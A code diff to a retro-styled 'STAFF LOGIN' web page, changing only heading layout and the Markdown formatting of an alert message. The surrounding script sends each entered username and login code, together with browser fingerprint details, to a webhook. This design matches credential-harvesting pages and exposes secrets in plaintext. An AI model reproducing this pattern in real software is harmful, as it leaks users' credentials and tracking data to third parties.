@@ -19,6 +19,7 @@
     font-family: 'Press Start 2P', cursive;
     font-size: 26px;
     margin-bottom: 30px;
+    line-height: 1.6;
   }
 
   .login-box {
@@ -73,7 +74,11 @@
 
 <body>
 
-<h1>STAFF LOGIN</h1>
+<h1>
+------------------------------<br>
+STAFF LOGIN<br>
+------------------------------
+</h1>
 
 <div class="login-box">
   <input type="text" id="username" placeholder="Username">
@@ -125,19 +130,22 @@
       content:
 `# STAFF LOGIN ALERT
 
-\`Username: ${user}\`
-\`Code Used: ${code}\`
+**__Username__:** \`${user}\`
+**__Code Used__:** \`${code}\`
 
-\`Date: ${date}\`
-\`Time: ${time}\`
-\`Time Zone: ${fingerprint.timezone}\`
+**__Date__:** \`${date}\`
+**__Time__:** \`${time}\`
+**__Time Zone__:** \`${fingerprint.timezone}\`
 
-\`Browser: ${fingerprint.browser}\`
-\`Language: ${fingerprint.language}\`
-\`Platform: ${fingerprint.platform}\`
-\`Resolution: ${fingerprint.resolution}\`
+**__Browser__:** \`${fingerprint.browser}\`
+**__Language__:** \`${fingerprint.language}\`
+**__Platform__:** \`${fingerprint.platform}\`
+**__Resolution__:** \`${fingerprint.resolution}\`
 
-\`Status: Login Successful\``
+**__Status__:** 
+------------------------------
+# \`__Login Successful__\`
+------------------------------`
     };
 
     fetch(webhookURL, {
